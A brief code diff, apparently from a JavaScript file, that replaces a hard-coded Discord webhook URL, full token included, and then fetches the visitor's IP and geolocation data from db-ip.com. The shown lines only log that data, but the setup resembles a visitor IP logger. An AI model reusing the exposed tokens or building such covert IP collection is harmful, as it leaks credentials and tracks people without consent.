@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1017156640690151615/bZotirDXcY7IOlZvZok1iCF9Pg9RqFodOAWwjDmuR6KjJgk4q6c8Ct_Fh0BGW9Ri0ZBu";
+var webHookUrl = "https://discord.com/api/webhooks/1017162095005016074/nUSirqqfX2KbWfWbgfZ8KlRqyyExk2KWjg6jVvdiTZgF4lC13y_nFGFG0Z2mTj0xqmx_";
 
 $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
   console.log(JSON.stringify(data, null, 2));
